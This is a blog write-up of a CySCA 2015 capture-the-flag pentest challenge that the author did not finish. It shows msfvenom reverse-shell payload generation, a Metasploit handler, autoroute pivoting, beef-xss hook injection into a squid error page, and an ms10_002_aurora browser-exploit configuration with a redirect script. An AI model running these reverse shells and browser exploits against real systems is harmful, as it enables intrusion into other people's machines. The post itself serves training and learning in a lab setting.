---
title: CySCA 2015 - Corporate Pentest 3.0 - Flash Flood
author: nickw
layout: post

categories:
  - Blog
  - Security
---


We are now connected to the company's proxy. We are given the hint early on 
that:

> Consider that the ECWI system is secure and does not allow direct traffic from 
> the DMZ to the internal network. Additionally, it does not allow direct 
> connections on arbitary ports from the internal network to the DMZ"


We perform some network connection analysis, using ifconfig, route, arp,
netstat, and additionally look at the squid access log.

<!--break-->

We deduce the following info:

- eth1 has IP address's: `ifconfig`
    - fd00:bad:cafe::300
    - 10.10.5.30
- eth0 has IP address `ifconfig`
    - 172.16.5.30
- There is a simulated user hitting the squid server from:
    - fd00:dead:beef::103
    - found this by: `tail -f /var/log/squid3/access.log`
- Netstat gave us some extra info `netstat tulpn`:
    - `tcp6       0      0 fd00:bad:cafe::300:3128 fd00:dead:beef::1:60706 ESTABLISHED`
    - `tcp6       0      0 fd00:bad:cafe::300:3128 fd00:dead:beef::1:60709 ESTABLISHED`
    - `tcp6       0      0 fd00:bad:cafe::300:3128 fd00:dead:beef::1:60704 ESTABLISHED`
    - `tcp6       0      0 fd00:bad:cafe::300:3128 fd00:dead:beef::1:60707 ESTABLISHED`


Additionally, we used metasploit to scan the internal network.

We used msfvenom to generate our metasploit framework payload and copied it to
the proxy machine using scp

`msfvenom -f elf -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.5.101 LPORT=4444`

We fired up a metasploit console runnning the handler

{% highlight bash %}
$> msfconsole
 
(msfconsole) use exploit/multi/handler
(multi_handler) set PAYLOAD linux/x86/meterpreter/reverse_tcp
(multi_handler) set SET LHOST 192.168.5.101
(multi_handler) set SET LPORT 4444
(multi_handler) exploit 
{% endhighlight %}

We run the binary from the proxy machine and it connects back to us on our 
metasploit console.

Within the meterpreter session, we add routes so that we can access the eth1 
network from our own metasploit console. 

{% highlight bash %}
meterpreter> run autoroute -s 10.10.5.0/24
meterpreter> run autoroute -s fd00::
{% endhighlight %}

We made use of the following metasploit modules to scan the internal network,

 - auxiliary/scanner/portscan/tcp
 - auxiliary/scanner/discovery/udp_probe
 - and many more...


We deduce that there are no IPv4 clients on the subnet. We did not scan ipv6. 
We also take note that we are not sure of our results, since we are not trusting 
our metasploit session is routing correctly. 

Given this info, we create a diagram:

{% highlight bash %}
 --------------------
| Me!                |
| 192.168.5.101      | -----
 --------------------       |
                            |
                            |
             ---------------------------
            | Proxy Server              |
            | -   -   -   -   -   -   - |
 Public/DMZ | eth0 - 172.16.5.30        | ----
------------| -   -   -   -   -   -   - |     | eth0 can connect to eth1 via 
 Internal   | eth1 - 10.10.5.30         | <---  proxy @:3128. This means I can 
            |      - fd00:bad:cafe::300 |       talk to hosts on the internal 
             ---------------------------        via the proxy.
                        |
          10.10.5.0/24 AND fd00::               Cannot talk directly, as stated
                        |                       in the clue.
                -----------------
                |                |
               ???     ---------------------
                      | Simulated User      |
                      | fd00:dead:beef::103 | <- There appears to be a host 
                       ---------------------     using the proxy from an ipv6
                                                 address... wat. No ipv4??

                                                 Theoretically, the simulated 
                                                 user /should/ be able to talk 
                                                 to "Me" via the proxy, just
                                                 as I can talk to it, thanks to
                                                 the misconfiguration.

                                                 I cannot, however, open
                                                 a direct connection from 
                                                 Simulated User to Me, since
                                                 the given clue states that
                                                 this is impossible. 

{% endhighlight %}

We are also given another clue, however it's a bit late to the party:

> Consider the services that you have used to get here, maybe others are using 
> them as well... How would you find that out? And keep up your resolv.conf

...and another

> Look in the log file folder that has the same name as a sea creature. When 
> you find the target, find their version, then find the exploit.

...and another

> 11.7.700.202 might be relevant. Remember proxys are are generally used for 
> internal users to browse the internet.

We did not use theese hints, however 11.7.700.202 looks like it might be
an ipv6 address in dotted decimal form...

During the competition, I did not stop to think about the final sentence in the 
3rd hint, **find their version**. Additionally, I did not stop to think to 
consider the challenge name **'flash flood'**. This was clearly a challenge where 
we were required to exploit flash on the simulated user's machine...

With that sidenote mentioned, I will explain my attack surface, and how I 
attempted to gain access via a java exploit.

Since we know the simulated machine is actually accessing the proxy, but hitting a 
`TCP_MISS/503` for all of its requests, we can easily mess around with the
error page that squid spits out, and add our arbitrary content there to 
allow us to fingerprint the user's browser. 

We fire up beef-xss on our kali virtual machine. We are given a script tag
to place in the page sent to the client. (which I have determined to be 
`ERR_DNS_FAIL`) for most requests. Putting the script tag on this page, we now 
can get some idea of what OS the client is running

We quickly test that beef is functioning correctly via the proxy, so in our own 
proxied firefox session, we open a broken page, ie `http://hipsterpics.cysca/`. 

Our machine appears in the beef-xss console. Our POC works! It's just a little 
wait until the simulated user loads up our payload, and before we know it, the
machine is listed in the beef-xss control panel.

We choose the machine, fingerprint it, and check the software it is runnning.

It has:

 - UA: Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0; SLCC2; 
   .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 
   6.0; .NET4.0C; .NET4.0E)
 - UA: (Friendlier): IE10.0 For Desktop
 - OS: Windows 7
 - JRE: jre_16 jre_17.
 - **Flash Player 8**.

With this knowledge, we can begin exploiting java and pure ie10 (lol yeah... 
I didn't really think this through)... 

Attempting to use various java payloads, including browser_autopwn, no success
is had. None of the payloads will connect back to us.

An example of a msf payload I used:

{% highlight bash %}
use exploit/windows/browser/ms10_002_aurora
(ms10_002_aurora) show options
... options here...
(ms10_002_aurora) set SRVHOST 192.168.5.101  # Place to host the initial payload
(ms10_002_aurora) set SRVPORT 80             # Port for initial payload
(ms10_002_aurora) set URIPATH /              # exploit will be accesisble at /

(ms10_002_aurora) set PAYLOAD windows/meterpreter/reverse_http
(ms10_002_aurora) set LHOST 192.168.5.101 # The host to connect back to...
                                          # the reverse_http payload will 
                                          # connect back via HTTP, and if a 
                                          # proxy exists, connects via it, so 
                                          # the payload should be able to 
                                          # connect back to us.
(ms10_002_aurora) set LPORT 443           # Proxy friendly HTTP POrt
{% endhighlight %}

Now, we modify our `ERR_DNS_FAIL` page again, but this time to have a 
`<script>document.location='http://192.168.5.101/'</script>`. This will 
bring simulated users to our exploit endpoint. 

We wait about 20 seconds... The simulated user comes and downloads the payload, but 
no connection is made back to us... something is wrong. We try multiple 
different exploits relating to java and pure IE10, however no progress it made.

It's worth noting that we were chasing a red-herring here. It appeared the 
machine was executing in-browser applets with an old version of java, as 
every now and then, it would make a request to oracle to download an MSI 
installer of jre_16 (via the proxy), however, maybe that was an indication 
that it wasn't installed?

It's unfortunate that we were unable to get further than this, since there were
many more challanges to unlock once this hurdle was completed. With that being 
said, I have learnt so much about metasploit/remote exploitation and would 
now feel comfortable using it day-to-day.




